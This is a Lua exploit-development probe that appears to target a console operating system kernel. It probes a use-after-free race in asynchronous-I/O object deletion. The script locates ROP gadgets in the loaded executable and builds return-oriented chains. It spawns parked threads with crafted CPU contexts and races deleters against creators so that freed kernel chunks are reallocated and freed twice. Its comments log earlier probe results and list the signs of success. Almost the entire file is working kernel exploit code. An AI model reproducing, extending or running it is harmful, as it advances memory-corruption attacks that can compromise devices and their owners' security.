-- CRASH_CLASS: HIGH
-- PROBE 795a: allocate aio objects while a delete is in its free window
--
-- Context: 664 poll sets W+0xc = 1 (0x3b1553), which is the byte the delete's
-- re-lookup branch tests at 0x3afe59. Every object this process can delete has
-- been polled, so every successful delete unlocks at 0x3afe63, re-looks the id
-- up, frees C, S, D, P and T, and only then clears the slot and removes the
-- table entry. 791b-792d showed the second caller always loses at the re-lookup
-- (it reads 0 and frees nothing), so the window has never been populated.
--
-- The window is a free-then-reuse window: if another thread allocates a work
-- item T (0x30) or a context C (0x30) between the winner's frees and the slot
-- clear, the loser's re-lookup still resolves the slot and frees whatever now
-- occupies it. Earlier attempts could not allocate at the right moment because
-- a child could only issue the syscall it entered with. 792b showed the child's
-- ctx carries five arguments, and this probe adds the missing piece: a child
-- parked in read(2) can pop rcx in its chain (eboot has `pop rcx; ret`), so a
-- parked child can issue a five-argument 669 immediately after the release.
--
-- So: two deleters and six creators are released together. The creators race the
-- deleters for the just-freed chunks. Signals to look for, in order of strength:
--   * two creators receive the same id (a chunk handed out twice),
--   * a creator polls 1/2 or fails its delete although it was never touched,
--   * a deleter reports 0 and the id is still deletable by the parent later,
--   * a parent delete after the round misses (0x80020003) on a live object.
-- A clean round means the allocator was not reached by the loser, not that the
-- race is absent.

print("=== PROBE 795a: allocation during the delete free window ===")
print("")
local function to_num(v)
    if type(v)=="table" and v.tonumber then return v:tonumber() end
    if type(v)=="table" and v.h then return v.h*4294967296+v.l end
    return tonumber(v) or 0
end
local function mk(n)
    local t={}
    for k,v in pairs(syscall.pipe) do t[k]=v end
    t.syscall_no=n
    setmetatable(t,getmetatable(syscall.pipe))
    return t
end
local function rd(a) local o,v=pcall(function() return memory.read_dword(a) end); if o then return to_num(v) end end
local function wd(a,v) pcall(function() memory.write_dword(a,v) end) end
local function wq(a,v) pcall(function() memory.write_qword(a,v) end) end
local function zero(a,n) pcall(function() for i=0,n-4,4 do memory.write_dword(a+i,0) end end) end

local READ, WRITE, SOCKETPAIR = 3, 4, 135
local fn_ud = syscall.pipe.fn_addr
local fn = to_num(fn_ud)
print("[0] pid=" .. tostring(to_num(native.fcall_with_rax(fn_ud, 20))))

local info = memory.alloc(0x200)
wd(info, 0x160)
pcall(function() mk(593)(uint64(0), uint64(info)) end)
local ebase = (rd(info+0x10C) or 0)*4294967296 + (rd(info+0x108) or 0)
local function find_pat(base, limit, pat)
    local chunk, off = 0x1000, 0
    while off < limit do
        local want = limit - off
        if want > chunk then want = chunk end
        local ok, s = pcall(function() return memory.read_buffer(base+off, want) end)
        if not ok or type(s) ~= "string" then return nil end
        local i = string.find(s, pat, 1, true)
        if i then return base + off + i - 1 end
        off = off + want
    end
    return nil
end
local pop_rax = find_pat(ebase, 0x494000, string.char(0x58,0xC3))
local pop_rdi = find_pat(ebase, 0x494000, string.char(0x5F,0xC3))
local pop_rsi = find_pat(ebase, 0x494000, string.char(0x5E,0xC3))
local pop_rdx = find_pat(ebase, 0x494000, string.char(0x5A,0xC3))
local pop_rcx = find_pat(ebase, 0x494000, string.char(0x59,0xC3))
local jmp_g   = find_pat(ebase, 0x494000, string.char(0xEB,0xFE))
if not (pop_rax and pop_rdi and pop_rsi and pop_rdx and pop_rcx and jmp_g) then
    print("[0] gadgets missing") return
end
print(string.format("[0] eboot=%X pop_rcx=%X", ebase, pop_rcx))

local sc_mmap = mk(477)
local page = 0x4000
local function mmap(px)
    local _, a = pcall(function() return sc_mmap(uint64(0), uint64(px), uint64(3), uint64(0x1002), uint64(0xFFFFFFFF), uint64(0)) end)
    local v = to_num(a)
    if v ~= 0 then zero(v, px) end
    return v
end

local Ctx = {MAGIC=0x108, TYPE=0x110, CS=0x0C0, RIP=0x0E0, RSP=0x0F8, SS=0x100,
             RDI=0x048, RSI=0x050, RDX=0x058, RCX=0x060, R8=0x068, RAX=0x078}
local STACK = page*4

local function spawn_parked(fd, chainw, r8val)
    local block = mmap(STACK)
    local base = block + STACK - 0x200
    local p = base
    for i = 1, #chainw do wq(p + (i-1)*8, uint64(chainw[i])) end
    local buf = mmap(page)
    local ctx = memory.alloc(0x500)
    zero(ctx, 0x500)
    wq(ctx+Ctx.MAGIC, uint64(0x480)); wq(ctx+Ctx.TYPE, uint64(0x10000))
    wq(ctx+Ctx.CS, uint64(0x43));     wq(ctx+Ctx.SS, uint64(0x3B))
    wq(ctx+Ctx.RIP, uint64(fn));      wq(ctx+Ctx.RSP, uint64(base))
    wq(ctx+Ctx.RDI, uint64(fd));      wq(ctx+Ctx.RSI, uint64(buf))
    wq(ctx+Ctx.RDX, uint64(1));       wq(ctx+Ctx.RAX, uint64(READ))
    if r8val then wq(ctx+Ctx.R8, uint64(r8val)) end
    local tb = memory.alloc(8)
    wq(tb, uint64(0))
    local ok, rv = pcall(function() return mk(430)(uint64(ctx), uint64(tb), uint64(0)) end)
    return ok and to_num(rv) == 0, rd(tb) or 0, buf
end

-- delete chain: 662(ids, 1, statpage)
local function chain_delete(idpage, statpage, count)
    return {pop_rdi, idpage, pop_rsi, count or 1, pop_rdx, statpage, pop_rax, 662, fn,
            pop_rax, 431, fn, jmp_g}
end
-- create chain: 669(0x1001, data, 1, 1, out) with R8 preset to out
local function chain_create(data)
    return {pop_rdi, 0x1001, pop_rsi, data, pop_rdx, 1, pop_rcx, 1,
            pop_rax, 669, fn, pop_rax, 431, fn, jmp_g}
end

local ts = memory.alloc(16)
local function sleep_ms(ms) wq(ts,0); wq(ts+8, ms*1000000); pcall(function() mk(240)(uint64(ts), uint64(0)) end) end

local fds = memory.alloc(8)
local function pairsock()
    wd(fds, 0xFFFFFFFF); wd(fds+4, 0xFFFFFFFF)
    local ok, rv = pcall(function() return mk(SOCKETPAIR)(uint64(1), uint64(1), uint64(0), uint64(fds)) end)
    return ok and to_num(rv) == 0, rd(fds) or 0, rd(fds+4) or 0
end

local sc669, sc662, sc664 = mk(669), mk(662), mk(664)
local function create1(data, out)
    local ok, rv = pcall(function() return sc669(uint64(0x1001), uint64(data), uint64(1), uint64(1), uint64(out)) end)
    return to_num(rv), rd(out) or 0
end
local function poll1(ids, out)
    pcall(function() return sc664(uint64(ids), uint64(1), uint64(out)) end)
    return rd(out) or 0
end
local function del1(ids, out)
    local ok, rv = pcall(function() return sc662(uint64(ids), uint64(1), uint64(out)) end)
    return to_num(rv), rd(out) or 0
end

-- [A] control: one parked creator, released alone
local cdata = mmap(page)
local cout  = mmap(page)
local cr8   = mmap(8)
local okS, cr1, cr2 = pairsock()
if not (okS and cr1) then print("[A] socketpair failed"); return end
local okC = spawn_parked(cr2, chain_create(cdata), cout)
local written = pcall(function() return mk(WRITE)(uint64(cr1), uint64(cr8), uint64(1), uint64(0), uint64(0)) end)
sleep_ms(20)
local ctrl_id = rd(cout) or 0
print(string.format("[A] parked-create ok=%s write=%s id=%06X", tostring(okC), tostring(written), ctrl_id))
if ctrl_id == 0 then
    print("[A] the chain create did not work, stopping")
    return
end
local ctl_ids = memory.alloc(4)
wd(ctl_ids, ctrl_id)
local ctl_st = mmap(page)
print(string.format("[B] control poll=%X delete=%X", poll1(ctl_ids, ctl_st), (del1(ctl_ids, ctl_st))))

-- [C] rounds: 24 count=1 blocks, deleted in one call by two parked children
-- while ten parked creators allocate into the same window.
local N = 24
local ROUNDS = 2
local dup_total, anom_total, doubles = 0, 0, 0
local st = mmap(page)
local one = mmap(4)
for round = 1, ROUNDS do
    local ids = mmap(page)
    local built = {}
    for i = 0, N-1 do
        local d, o = mmap(page), mmap(page)
        local rv, id = create1(d, o)
        if rv ~= 0 then break end
        wd(ids + i*4, id)
        built[#built+1] = id
    end
    local polled = 0
    if #built == N then
        local okp = pcall(function() return sc664(uint64(ids), uint64(N), uint64(st)) end)
        for i = 0, N-1 do if (rd(st + i*4) or 0) == 3 then polled = polled + 1 end end
    end
    print(string.format("[C%d] built=%d poll3=%d", round, #built, polled))
    if polled ~= N then
        for i = 1, #built do wd(one, built[i]); poll1(one, st); del1(one, st) end
    else
        local s1, d1, d2 = pairsock()
        local s2, d3, d4 = pairsock()
        local sA, sB = mmap(page), mmap(page)
        local okA = s1 and spawn_parked(d2, chain_delete(ids, sA, N)) or false
        local okB = s2 and spawn_parked(d4, chain_delete(ids, sB, N)) or false
        local outs, cfds, cr8s = {}, {}, {}
        for c = 1, 10 do
            local sok, a, b = pairsock()
            local d, o = mmap(page), mmap(page)
            local r8 = mmap(8)
            outs[c] = o; cr8s[c] = r8
            cfds[c] = {a, b, ok = (sok and spawn_parked(b, chain_create(d), o)) or false}
        end
        pcall(function() return mk(WRITE)(uint64(d1), uint64(ids), uint64(1), uint64(0), uint64(0)) end)
        pcall(function() return mk(WRITE)(uint64(d3), uint64(ids), uint64(1), uint64(0), uint64(0)) end)
        for c = 1, 10 do
            pcall(function() return mk(WRITE)(uint64(cfds[c][1]), uint64(cr8s[c]), uint64(1), uint64(0), uint64(0)) end)
        end
        sleep_ms(120)
        local za, zb = 0, 0
        for i = 0, N-1 do
            if (rd(sA + i*4) or -1) == 0 then za = za + 1 end
            if (rd(sB + i*4) or -1) == 0 then zb = zb + 1 end
        end
        doubles = doubles + za + zb - N
        local cids, seen, dup = {}, {}, 0
        for c = 1, 10 do
            local v = rd(outs[c]) or 0
            cids[#cids+1] = v
            if v ~= 0 then
                if seen[v] then dup = dup + 1 else seen[v] = true end
            end
        end
        dup_total = dup_total + dup
        local cl = ""
        for c = 1, #cids do cl = cl .. string.format("%06X ", cids[c]) end
        print(string.format("[D%d] delA zeros=%d delB zeros=%d creators=[%s] dup=%d",
            round, za, zb, cl, dup))
        local anom = 0
        local ost = mmap(page)
        for c = 1, #cids do
            if cids[c] ~= 0 then
                wd(one, cids[c])
                local p = poll1(one, ost)
                local _, dd = del1(one, ost)
                if p ~= 3 or dd ~= 0 then anom = anom + 1 end
            end
        end
        anom_total = anom_total + anom
        print(string.format("[E%d] creator anomalies=%d", round, anom))
    end
    sleep_ms(10)
end

-- [F] parent health after the rounds
local h_ok, h_anom = 0, 0
local hids = mmap(4)
for i = 1, 8 do
    local d, o = mmap(page), mmap(page)
    local rv, id = create1(d, o)
    if rv == 0 then
        wd(hids, id)
        local p = poll1(hids, st)
        local _, dd = del1(hids, st)
        if p == 3 and dd == 0 then h_ok = h_ok + 1 else h_anom = h_anom + 1 end
    else
        h_anom = h_anom + 1
    end
end
print(string.format("[F] duplicate creator ids=%d creator anomalies=%d health ok=%d/8",
    dup_total, anom_total, h_ok))
print(string.format("[G] alive pid=%s", tostring(to_num(native.fcall_with_rax(fn_ud, 20)))))
